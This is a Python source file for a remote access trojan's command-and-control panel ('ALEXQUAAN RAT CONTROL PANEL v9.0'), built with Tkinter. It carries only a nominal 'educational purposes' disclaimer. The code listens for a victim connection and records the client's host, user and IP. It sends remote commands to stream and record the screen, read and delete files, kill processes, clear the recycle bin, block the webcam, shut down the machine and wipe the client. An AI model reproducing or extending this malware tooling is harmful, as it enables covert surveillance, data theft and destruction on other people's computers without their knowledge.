
import socket
import sys
import threading
import tkinter as tk
from tkinter import ttk, messagebox, filedialog, scrolledtext
import os
import subprocess
import time
import json
import random
import math
import queue
from datetime import datetime

HOST = "0.0.0.0"
PORT = 3667
STREAM_PORT = 3668
BUFFER = 65536

# ============== ASCII ART ==============
BANNER_ASCII = """
   █████████   █████       ██████████ █████ █████    ██████    █████  █████   █████████   ██████   █████    ███████████     █████████   ███████████      █████████     ███████    ██████   █████ ███████████ ███████████      ███████    █████      
  ███░░░░░███ ░░███       ░░███░░░░░█░░███ ░░███   ███░░░░███ ░░███  ░░███   ███░░░░░███ ░░██████ ░░███    ░░███░░░░░███   ███░░░░░███ ░█░░░███░░░█     ███░░░░░███  ███░░░░░███ ░░██████ ░░███ ░█░░░███░░░█░░███░░░░░███   ███░░░░░███ ░░███       
 ░███    ░███  ░███        ░███  █ ░  ░░███ ███   ███    ░░███ ░███   ░███  ░███    ░███  ░███░███ ░███     ░███    ░███  ░███    ░███ ░   ░███  ░     ███     ░░░  ███     ░░███ ░███░███ ░███ ░   ░███  ░  ░███    ░███  ███     ░░███ ░███       
 ░███████████  ░███        ░██████     ░░█████   ░███     ░███ ░███   ░███  ░███████████  ░███░░███░███     ░██████████   ░███████████     ░███       ░███         ░███      ░███ ░███░░███░███     ░███     ░██████████  ░███      ░███ ░███       
 ░███░░░░░███  ░███        ░███░░█      ███░███  ░███   ██░███ ░███   ░███  ░███░░░░░███  ░███ ░░██████     ░███░░░░░███  ░███░░░░░███     ░███       ░███         ░███      ░███ ░███ ░░██████     ░███     ░███░░░░░███ ░███      ░███ ░███       
 ░███    ░███  ░███      █ ░███ ░   █  ███ ░░███ ░░███ ░░████  ░███   ░███  ░███    ░███  ░███  ░░█████     ░███    ░███  ░███    ░███     ░███       ░░███     ███░░███     ███  ░███  ░░█████     ░███     ░███    ░███ ░░███     ███  ░███      █
 █████   █████ ███████████ ██████████ █████ █████ ░░░██████░██ ░░████████   █████   █████ █████  ░░█████    █████   █████ █████   █████    █████       ░░█████████  ░░░███████░   █████  ░░█████    █████    █████   █████ ░░░███████░   ███████████
░░░░░   ░░░░░ ░░░░░░░░░░░ ░░░░░░░░░░ ░░░░░ ░░░░░    ░░░░░░ ░░   ░░░░░░░░   ░░░░░   ░░░░░ ░░░░░    ░░░░░    ░░░░░   ░░░░░ ░░░░░   ░░░░░    ░░░░░         ░░░░░░░░░     ░░░░░░░    ░░░░░    ░░░░░    ░░░░░    ░░░░░   ░░░░░    ░░░░░░░    ░░░░░░░░░░░ 
                                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                                                                      
ALEXQUAAN RAT CONTROL PANEL v9.0 - ULTIMATE EDITION 
AUTHOR: ALEXQUAAN | GITHUB:https://github.com/daoq51903-ship-it DONT USE THIS FOR ILLEGAL PURPOSES, THIS IS FOR EDUCATIONAL PURPOSES ONLY. I AM NOT RESPONSIBLE FOR ANY DAMAGE CAUSED BY THIS SOFTWARE.
"""

class FastAnimatedButton(tk.Frame):
    def __init__(self, parent, text, command, color="#2d2d2d", hover_color="#3d6e3d", icon="", **kwargs):
        super().__init__(parent, bg=color, **kwargs)
        self.command = command
        self.color = color
        self.hover_color = hover_color
        
        display_text = f"{icon} {text}" if icon else text
        self.label = tk.Label(self, text=display_text, bg=color, fg="white", font=("Consolas", 9))
        self.label.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        self.bind("<Enter>", self.on_enter)
        self.bind("<Leave>", self.on_leave)
        self.bind("<Button-1>", self.on_click)
        self.label.bind("<Enter>", self.on_enter)
        self.label.bind("<Leave>", self.on_leave)
        self.label.bind("<Button-1>", self.on_click)
    
    def on_enter(self, e):
        self.configure(bg=self.hover_color)
        self.label.configure(bg=self.hover_color)
    
    def on_leave(self, e):
        self.configure(bg=self.color)
        self.label.configure(bg=self.color)
    
    def on_click(self, e):
        if self.command:
            self.command()

class GradientFrame(tk.Canvas):
    """Frame với gradient màu"""
    def __init__(self, parent, color1="#0a0a0a", color2="#1a1a2e", **kwargs):
        super().__init__(parent, highlightthickness=0, **kwargs)
        self.color1 = color1
        self.color2 = color2
        self.bind("<Configure>", self._draw_gradient)
    
    def _draw_gradient(self, event=None):
        self.delete("gradient")
        width = self.winfo_width()
        height = self.winfo_height()
        
        r1, g1, b1 = int(self.color1[1:3], 16), int(self.color1[3:5], 16), int(self.color1[5:7], 16)
        r2, g2, b2 = int(self.color2[1:3], 16), int(self.color2[3:5], 16), int(self.color2[5:7], 16)
        
        for i in range(height):
            ratio = i / height
            r = int(r1 + (r2 - r1) * ratio)
            g = int(g1 + (g2 - g1) * ratio)
            b = int(b1 + (b2 - b1) * ratio)
            color = f"#{r:02x}{g:02x}{b:02x}"
            self.create_line(0, i, width, i, fill=color, tags="gradient")
        self.lower("gradient")
class ScrollableFrame(tk.Frame):
    def __init__(self, parent, bg="#0f0f0f", **kwargs):
        super().__init__(parent, bg=bg, **kwargs)
        
        self.canvas = tk.Canvas(self, bg=bg, highlightthickness=0)
        self.scrollbar = ttk.Scrollbar(self, orient="vertical", command=self.canvas.yview)
        self.scrollable_frame = tk.Frame(self.canvas, bg=bg)
        
        self.scrollable_frame.bind(
            "<Configure>",
            lambda e: self.canvas.configure(scrollregion=self.canvas.bbox("all"))
        )
        
        self.canvas.create_window((0, 0), window=self.scrollable_frame, anchor="nw")
        self.canvas.configure(yscrollcommand=self.scrollbar.set)
        
        self.canvas.pack(side="left", fill="both", expand=True)
        self.scrollbar.pack(side="right", fill="y")
        
        self._bind_mousewheel()
    
    def _bind_mousewheel(self):
        def _on_mousewheel(event):
            self.canvas.yview_scroll(int(-1*(event.delta/120)), "units")
        self.canvas.bind("<Enter>", lambda e: self.canvas.bind_all("<MouseWheel>", _on_mousewheel))
        self.canvas.bind("<Leave>", lambda e: self.canvas.unbind_all("<MouseWheel>"))
    
    def get_frame(self):
        return self.scrollable_frame
    
class CmdServerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("ALEXQUAAN C2 PANEL v9.0 - ULTIMATE EDITION")
        self.root.geometry("1400x900")
        self.root.configure(bg="#0a0a0a")
        self.root.minsize(1200, 750)
        
        # Socket
        self.server_socket = None
        self.client_socket = None
        self.stream_socket = None
        
        # Threads
        self.is_running = True
        self.current_input_start = "1.0"
        self.receive_thread = None
        self.connection_thread = None
        self.client_address = None
        
        # Stream
        self.streaming_active = False
        
        # Log queue
        self.log_queue = queue.Queue()
        
        # Command history
        self.command_history = []
        self.history_index = 0
        
        self.setup_ui()
        self.start_server_socket()
        self.process_log_queue()
        
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
    
    def setup_ui(self):
        # Main frame
        main_frame = tk.Frame(self.root, bg="#0a0a0a")
        main_frame.pack(fill=tk.BOTH, expand=True, padx=2, pady=2)
        
        # Header
        header_frame = GradientFrame(main_frame, color1="#0a0a0a", color2="#1a1a2e", height=160)
        header_frame.pack(fill=tk.X, pady=(0, 10))
        header_frame.pack_propagate(False)
        
        ascii_label = tk.Label(header_frame, text=BANNER_ASCII, bg="#1a1a2e", fg="#00ff88", 
                                font=("Courier", 7), justify=tk.LEFT)
        ascii_label.pack(expand=True)
        
        # Paned window
        paned = ttk.PanedWindow(main_frame, orient=tk.HORIZONTAL)
        paned.pack(fill=tk.BOTH, expand=True)
        
        # ========== LEFT PANEL ==========
        left_container = tk.Frame(paned, bg="#0f0f0f")
        paned.add(left_container, weight=1)
        
        left_panel = tk.Frame(left_container, bg="#0f0f0f")
        left_panel.pack(fill=tk.BOTH, expand=True)
        
        # Panel header
        panel_header = GradientFrame(left_panel, color1="#1a1a2e", color2="#0f0f0f", height=40)
        panel_header.pack(fill=tk.X)
        panel_header.pack_propagate(False)
        tk.Label(panel_header, text="🛠️ CONTROL PANEL", font=("Consolas", 12, "bold"),
                 bg="#1a1a2e", fg="#00ff88").pack(expand=True)
        
        # Scrollable buttons
        scrollable = ScrollableFrame(left_panel)
        scrollable.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        btn_frame = scrollable.get_frame()
        
        # Buttons list
        buttons = [
            ("🖥️", "SYSTEM INFO", self.send_info),
            ("📁", "LIST FILES", self.send_list),
            ("🌐", "GET IP", self.send_ip),
            ("📡", "START STREAM", self.start_stream),
            ("⏹️", "STOP STREAM", self.stop_stream),
            ("🎥", "START RECORD", self.start_record),
            ("⏹️", "STOP RECORD", self.stop_record),
            ("🗑️", "STOP + DELETE", self.stop_and_delete),
            ("📹", "SEND VIDEO", self.send_video_prompt),
            ("🔫", "KILL PROCESS", self.kill_process_prompt),
            ("📋", "LIST PROCS", self.list_processes),
            ("❌", "DELETE FILE", self.delete_file_prompt),
            ("📸", "DEL SCREENSHOTS", self.delete_screenshots),
            ("🔄", "CLEAR RECYCLE", self.clear_recycle),
            ("📷", "BLOCK WEBCAM", self.block_webcam),
            ("📷", "UNBLOCK WEBCAM", self.unblock_webcam),
            ("🧹", "DEL ALL VIDEOS", self.delete_all_videos),
            ("📄", "READ FILE", self.read_file_prompt),
            ("💻", "OPEN CALC", self.open_calc),
            ("🎬", "OPEN YOUTUBE", self.open_youtube),
            ("🌐", "OPEN WEB", self.open_web),
            ("⚡", "SHUTDOWN", self.send_shutdown),
            ("🔄", "RESTART", self.send_restart),
            ("💀", "SELF DESTRUCT", self.self_destruct),
            ("🔌", "DISCONNECT", self.disconnect_client),
        ]
        
        for icon, text, cmd in buttons:
            btn = FastAnimatedButton(btn_frame, text=text, command=cmd, icon=icon)
            btn.pack(fill=tk.X, pady=2, padx=10)
        
        # ========== RIGHT PANEL ==========
        right_container = tk.Frame(paned, bg="#0a0a0a")
        paned.add(right_container, weight=3)
        
        right_panel = tk.Frame(right_container, bg="#0a0a0a")
        right_panel.pack(fill=tk.BOTH, expand=True)
        
        # Terminal frame
        terminal_frame = tk.Frame(right_panel, bg="#1a1a2e", bd=2, relief=tk.FLAT)
        terminal_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Terminal header
        term_header = GradientFrame(terminal_frame, color1="#1a1a2e", color2="#0a0a0a", height=35)
        term_header.pack(fill=tk.X)
        term_header.pack_propagate(False)
        
        tk.Label(term_header, text="💻 TERMINAL OUTPUT", font=("Consolas", 11, "bold"),
                 bg="#1a1a2e", fg="#00ff88").pack(side=tk.LEFT, padx=10)
        
        self.auto_scroll_var = tk.BooleanVar(value=True)
        tk.Checkbutton(term_header, text="Auto-scroll", variable=self.auto_scroll_var,
                       bg="#1a1a2e", fg="#00ff88", selectcolor="#1a1a2e").pack(side=tk.RIGHT, padx=5)
        
        self.show_time_var = tk.BooleanVar(value=True)
        tk.Checkbutton(term_header, text="Show Time", variable=self.show_time_var,
                       bg="#1a1a2e", fg="#00ff88", selectcolor="#1a1a2e").pack(side=tk.RIGHT, padx=5)
        
        tk.Button(term_header, text="🗑️ Clear", command=self.clear_terminal,
                  bg="#2d2d2d", fg="#00ff88", font=("Consolas", 8), bd=0, padx=5).pack(side=tk.RIGHT, padx=5)
        
        close_btn = tk.Label(term_header, text="✖", bg="#1a1a2e", fg="#888888", cursor="hand2")
        close_btn.pack(side=tk.RIGHT, padx=10)
        close_btn.bind("<Button-1>", lambda e: self.on_closing())
        
        # Terminal text
        self.terminal = scrolledtext.ScrolledText(
            terminal_frame, 
            bg="#0a0a0a", 
            fg="#00ff88",       
            insertbackground="#00ff88", 
            font=("Consolas", 11),      
            borderwidth=0,
            padx=10,
            pady=10,
            wrap=tk.WORD
        )
        self.terminal.pack(fill=tk.BOTH, expand=True)
        
        # Command entry
        cmd_frame = tk.Frame(right_panel, bg="#1a1a2e", height=40)
        cmd_frame.pack(fill=tk.X, pady=(5, 0))
        cmd_frame.pack_propagate(False)
        
        tk.Label(cmd_frame, text="╰─➤", bg="#1a1a2e", fg="#00ff88", font=("Consolas", 12, "bold")).pack(side=tk.LEFT, padx=10)
        
        self.cmd_entry = tk.Entry(cmd_frame, bg="#0a0a0a", fg="#00ff88", insertbackground="#00ff88",
                                   font=("Consolas", 11), bd=1, relief=tk.FLAT)
        self.cmd_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5, pady=5)
        self.cmd_entry.bind("<Return>", self.on_cmd_entry)
        self.cmd_entry.bind("<Up>", self.history_up)
        self.cmd_entry.bind("<Down>", self.history_down)
        
        # Status bar
        status_frame = tk.Frame(right_panel, bg="#1a1a2e", height=30)
        status_frame.pack(fill=tk.X, pady=(5, 0))
        status_frame.pack_propagate(False)
        
        self.status_var = tk.StringVar()
        self.status_var.set("🔴 STATUS: OFFLINE | WAITING FOR CONNECTION...")
        tk.Label(status_frame, textvariable=self.status_var, bg="#1a1a2e", fg="#888888", 
                anchor=tk.W, font=("Consolas", 9)).pack(side=tk.LEFT, padx=10)
        
        self.conn_indicator = tk.Canvas(status_frame, width=14, height=14, bg="#1a1a2e", highlightthickness=0)
        self.conn_indicator.pack(side=tk.RIGHT, padx=10)
        self.conn_indicator.create_oval(2, 2, 12, 12, fill="#ff0000", outline="")
        
        self.client_info_var = tk.StringVar()
        tk.Label(status_frame, textvariable=self.client_info_var, bg="#1a1a2e", fg="#00ff88", 
                anchor=tk.E, font=("Consolas", 9)).pack(side=tk.RIGHT, padx=10)
        
        self.animate_indicator() 
    def clear_terminal(self):
        self.terminal.delete(1.0, tk.END)
        self.log("[*] Terminal cleared")
    
    def animate_indicator(self):
        colors = ["#ff0000", "#ff4400", "#ff8800", "#ffcc00", "#00ff00"]
        idx = 0
        
        def _step():
            if not self.is_running:
                return
            nonlocal idx
            if self.client_socket:
                c = colors[-1]
            else:
                c = colors[idx % len(colors)]
                idx += 1
            try:
                self.conn_indicator.delete("light")
                self.conn_indicator.create_oval(2, 2, 12, 12, fill=c, outline="", tags="light")
            except:
                pass
            self.root.after(300, _step)
        
        self.root.after(500, _step)
    
    def update_status(self, text, is_connected=False, client_info=""):
        self.status_var.set(text)
        self.client_info_var.set(client_info)
        if is_connected:
            self.conn_indicator.delete("light")
            self.conn_indicator.create_oval(2, 2, 12, 12, fill="#00ff00", outline="", tags="light")
        else:
            self.conn_indicator.delete("light")
            self.conn_indicator.create_oval(2, 2, 12, 12, fill="#ff0000", outline="", tags="light")
        self.root.update_idletasks()
    
    def log(self, text):
        timestamp = datetime.now().strftime("[%H:%M:%S]") if self.show_time_var.get() else ""
        prefix = f"{timestamp} " if timestamp else ""
        self.log_queue.put(f"{prefix}{text}")
    
    def process_log_queue(self):
        try:
            while True:
                text = self.log_queue.get_nowait()
                self.terminal.insert(tk.END, text + "\n")
                if self.auto_scroll_var.get():
                    self.terminal.see(tk.END)
                self.terminal.mark_set("insert", tk.END)
                self.current_input_start = self.terminal.index("insert")
        except queue.Empty:
            pass
        finally:
            self.root.after(50, self.process_log_queue)
    
    def start_server_socket(self):
        try:
            if self.server_socket:
                try:
                    self.server_socket.close()
                except:
                    pass
            
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((HOST, PORT))
            self.server_socket.listen(5)
            
            self.log(f"[*] Listening on {HOST}:{PORT}")
            self.update_status(f"🟢 STATUS: LISTENING ON {HOST}:{PORT}")
            
            self.connection_thread = threading.Thread(target=self.accept_connections, daemon=True)
            self.connection_thread.start()
        except Exception as e:
            self.log(f"[!] Socket error: {e}")
            self.update_status(f"🔴 STATUS: ERROR - {e}")
            self.root.after(3000, self.start_server_socket)
    
    def accept_connections(self):
        while self.is_running:
            try:
                if self.client_socket:
                    time.sleep(0.5)
                    continue
                
                self.server_socket.settimeout(1)
                try:
                    self.client_socket, addr = self.server_socket.accept()
                except socket.timeout:
                    continue
                
                self.client_socket.settimeout(0.1)
                self.client_address = addr
                self.log(f"\n[+] DEVICE CONNECTED: {addr}")
                self.update_status(f"🟢 STATUS: CONNECTED TO {addr[0]}:{addr[1]}", True, "")
                
                self.receive_thread = threading.Thread(target=self.fast_receive_responses, daemon=True)
                self.receive_thread.start()
                
                self.cmd_entry.focus_set()
                self.send_command("ping")
                
            except Exception:
                time.sleep(0.5)
    
    def fast_receive_responses(self):
        buffer = ""
        last_ping = time.time()
        
        while self.is_running and self.client_socket:
            try:
                self.client_socket.settimeout(0.05)
                try:
                    chunk = self.client_socket.recv(BUFFER)
                    if not chunk:
                        break
                    
                    decoded = chunk.decode('utf-8', errors='ignore')
                    if decoded:
                        buffer += decoded
                        
                        while '\n' in buffer:
                            line, buffer = buffer.split('\n', 1)
                            line = line.strip()
                            if not line:
                                continue
                            
                            if line == "pong":
                                continue
                            elif line == "ping":
                                self.send_command("pong")
                                continue
                            elif line.startswith("CLIENT|"):
                                parts = line.split("|")
                                if len(parts) >= 4:
                                    self.update_status(self.status_var.get(), True, f"📡 {parts[1]} | 👤 {parts[2]} | 🌐 {parts[3]}")
                                    self.log(f"[+] CLIENT: {parts[1]} - USER: {parts[2]} - IP: {parts[3]}")
                                continue
                            else:
                                self.log(f"\n{line}")
                                self.root.after(0, lambda: None)
                    
                    if time.time() - last_ping > 30:
                        self.send_command("ping")
                        last_ping = time.time()
                        
                except socket.timeout:
                    continue
                    
            except (ConnectionResetError, BrokenPipeError):
                break
            except Exception:
                break
        
        self.client_socket = None
        self.client_address = None
        self.update_status("🔴 STATUS: WAITING FOR CONNECTION...", False, "")
        self.log("[*] CLIENT DISCONNECTED. WAITING FOR NEW CONNECTION...")
    
    def send_command(self, cmd):
        if not self.client_socket:
            return False
        try:
            full_cmd = cmd + "\n"
            self.client_socket.sendall(full_cmd.encode('utf-8'))
            if cmd not in ["ping", "pong"]:
                self.log(f"[→] {cmd}")
                self.command_history.append(cmd)
                self.history_index = len(self.command_history)
            return True
        except:
            return False
    
    def on_cmd_entry(self, event):
        cmd = self.cmd_entry.get().strip()
        if cmd:
            if cmd.lower() == "exit":
                self.disconnect_client()
            else:
                self.send_command(cmd)
        self.cmd_entry.delete(0, tk.END)
    
    def history_up(self, event):
        if self.history_index > 0:
            self.history_index -= 1
            self.cmd_entry.delete(0, tk.END)
            self.cmd_entry.insert(0, self.command_history[self.history_index])
        return "break"
    
    def history_down(self, event):
        if self.history_index < len(self.command_history) - 1:
            self.history_index += 1
            self.cmd_entry.delete(0, tk.END)
            self.cmd_entry.insert(0, self.command_history[self.history_index])
        elif self.history_index == len(self.command_history) - 1:
            self.history_index = len(self.command_history)
            self.cmd_entry.delete(0, tk.END)
        return "break"
    
    # ========== COMMANDS ==========
    def send_info(self):
        self.send_command("info")
    
    def send_list(self):
        self.send_command("list")
    
    def send_ip(self):
        self.send_command("ip")
    
    def start_stream(self):
        self.send_command("stream_on")
        self.log("[*] STREAM START COMMAND SENT")
    
    def stop_stream(self):
        self.send_command("stream_off")
        self.log("[*] STREAM STOP COMMAND SENT")
    
    def start_record(self):
        filename = f"rec_{int(time.time())}.mp4"
        self.send_command(f"rec {filename}")
        self.log(f"[*] START RECORD: {filename}")
    
    def stop_record(self):
        self.send_command("rec_stop")
        self.log("[*] STOP RECORD COMMAND SENT")
    
    def stop_and_delete(self):
        self.send_command("clean_record")
        self.log("[*] STOP AND DELETE COMMAND SENT")
    
    def delete_all_videos(self):
        self.send_command("rm_videos")
        self.log("[*] DELETE ALL VIDEOS COMMAND SENT")
    
    def send_video_prompt(self):
        file_path = filedialog.askopenfilename(title="Select video", 
                                                filetypes=[("Video", "*.mp4 *.avi *.mov *.mkv")])
        if file_path and self.client_socket:
            self.send_command(f"send_video \"{file_path}\" 0")
            self.log(f"[*] SENDING VIDEO: {os.path.basename(file_path)}")
    
    def kill_process_prompt(self):
        dialog = tk.Toplevel(self.root)
        dialog.title("Kill Process")
        dialog.geometry("400x180")
        dialog.configure(bg="#1a1a2e")
        dialog.transient(self.root)
        dialog.grab_set()
        
        tk.Label(dialog, text="🔫 KILL REMOTE PROCESS", font=("Consolas", 13, "bold"),
                 bg="#1a1a2e", fg="#ff4444").pack(pady=10)
        tk.Label(dialog, text="Process Name or PID:", bg="#1a1a2e", fg="white", font=("Consolas", 10)).pack()
        entry = tk.Entry(dialog, width=35, font=("Consolas", 11), bg="#0a0a0a", fg="#00ff88", insertbackground="#00ff88")
        entry.pack(pady=8)
        entry.focus()
        
        def do_kill():
            val = entry.get().strip()
            if val:
                if val.isdigit():
                    self.send_command(f"killpid {val}")
                else:
                    self.send_command(f"kill {val}")
                self.log(f"[*] KILL COMMAND: {val}")
            dialog.destroy()
        
        btn_frame = tk.Frame(dialog, bg="#1a1a2e")
        btn_frame.pack(pady=10)
        tk.Button(btn_frame, text="💀 KILL", command=do_kill, bg="#8b0000", fg="white", 
                  font=("Consolas", 10, "bold"), padx=25).pack(side=tk.LEFT, padx=10)
        tk.Button(btn_frame, text="CANCEL", command=dialog.destroy, bg="#2d2d2d", fg="white",
                  font=("Consolas", 10), padx=20).pack(side=tk.LEFT)
    
    def list_processes(self):
        self.send_command("ps")
        self.log("[*] LISTING PROCESSES...")
    
    def delete_file_prompt(self):
        dialog = tk.Toplevel(self.root)
        dialog.title("Delete File")
        dialog.geometry("500x170")
        dialog.configure(bg="#1a1a2e")
        dialog.transient(self.root)
        dialog.grab_set()
        
        tk.Label(dialog, text="🗑️ DELETE REMOTE FILE/DIRECTORY", font=("Consolas", 13, "bold"),
                 bg="#1a1a2e", fg="#ff8888").pack(pady=10)
        tk.Label(dialog, text="Path:", bg="#1a1a2e", fg="white", font=("Consolas", 10)).pack()
        entry = tk.Entry(dialog, width=55, font=("Consolas", 11), bg="#0a0a0a", fg="#00ff88", insertbackground="#00ff88")
        entry.pack(pady=8)
        entry.focus()
        
        def do_delete():
            path = entry.get().strip()
            if path:
                self.send_command(f"rm \"{path}\"")
                self.log(f"[*] DELETE COMMAND: {path}")
            dialog.destroy()
        
        btn_frame = tk.Frame(dialog, bg="#1a1a2e")
        btn_frame.pack(pady=10)
        tk.Button(btn_frame, text="🗑️ DELETE", command=do_delete, bg="#8b0000", fg="white",
                  font=("Consolas", 10, "bold"), padx=25).pack(side=tk.LEFT, padx=10)
        tk.Button(btn_frame, text="CANCEL", command=dialog.destroy, bg="#2d2d2d", fg="white",
                  font=("Consolas", 10), padx=20).pack(side=tk.LEFT)
    
    def delete_screenshots(self):
        self.send_command("rm_shots")
        self.log("[*] DELETE SCREENSHOTS COMMAND SENT")
    
    def clear_recycle(self):
        self.send_command("clear_bin")
        self.log("[*] CLEAR RECYCLE BIN COMMAND SENT")
    
    def block_webcam(self):
        self.send_command("block_cam")
        self.log("[*] BLOCK WEBCAM COMMAND SENT")
    
    def unblock_webcam(self):
        self.send_command("unblock_cam")
        self.log("[*] UNBLOCK WEBCAM COMMAND SENT")
    
    def read_file_prompt(self):
        dialog = tk.Toplevel(self.root)
        dialog.title("Read File")
        dialog.geometry("500x170")
        dialog.configure(bg="#1a1a2e")
        dialog.transient(self.root)
        dialog.grab_set()
        
        tk.Label(dialog, text="📄 READ REMOTE FILE", font=("Consolas", 13, "bold"),
                 bg="#1a1a2e", fg="#00ff88").pack(pady=10)
        tk.Label(dialog, text="File path:", bg="#1a1a2e", fg="white", font=("Consolas", 10)).pack()
        entry = tk.Entry(dialog, width=55, font=("Consolas", 11), bg="#0a0a0a", fg="#00ff88", insertbackground="#00ff88")
        entry.pack(pady=8)
        entry.focus()
        
        def do_read():
            path = entry.get().strip()
            if path:
                self.send_command(f"read \"{path}\"")
                self.log(f"[*] READ COMMAND: {path}")
            dialog.destroy()
        
        btn_frame = tk.Frame(dialog, bg="#1a1a2e")
        btn_frame.pack(pady=10)
        tk.Button(btn_frame, text="📖 READ", command=do_read, bg="#1e4d1e", fg="white",
                  font=("Consolas", 10, "bold"), padx=25).pack(side=tk.LEFT, padx=10)
        tk.Button(btn_frame, text="CANCEL", command=dialog.destroy, bg="#2d2d2d", fg="white",
                  font=("Consolas", 10), padx=20).pack(side=tk.LEFT)
    
    def open_calc(self):
        self.send_command("calc")
        self.log("[*] OPEN CALCULATOR COMMAND SENT")
    
    def open_youtube(self):
        self.send_command("youtube")
        self.log("[*] OPEN YOUTUBE COMMAND SENT")
    
    def open_web(self):
        self.send_command("web")
        self.log("[*] OPEN WEB COMMAND SENT")
    
    def send_shutdown(self):
        if messagebox.askyesno("Shutdown", "⚠️ SHUTDOWN REMOTE SYSTEM?", icon='warning'):
            self.send_command("shutdown")
            self.log("[*] SHUTDOWN COMMAND SENT")
    
    def send_restart(self):
        if messagebox.askyesno("Restart", "⚠️ RESTART REMOTE SYSTEM?", icon='warning'):
            self.send_command("restart")
            self.log("[*] RESTART COMMAND SENT")
    
    def self_destruct(self):
        if messagebox.askyesno("SELF DESTRUCT", "💀 THIS WILL WIPE THE CLIENT. CONTINUE?", icon='warning'):
            self.send_command("die")
            self.log("[*] SELF-DESTRUCT COMMAND SENT")
            self.disconnect_client()
    
    def disconnect_client(self):
        if self.client_socket:
            try:
                self.send_command("exit")
                self.client_socket.close()
            except:
                pass
            self.client_socket = None
            self.client_address = None
        self.update_status("🔴 STATUS: WAITING FOR CONNECTION...", False, "")
        self.log("[*] CLIENT DISCONNECTED. WAITING FOR NEW CONNECTION...")
    
    def on_closing(self):
        self.is_running = False
        if self.client_socket:
            try:
                self.client_socket.close()
            except:
                pass
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass
        self.root.destroy()

if __name__ == "__main__":
    root = tk.Tk()
    app = CmdServerGUI(root)
    root.mainloop()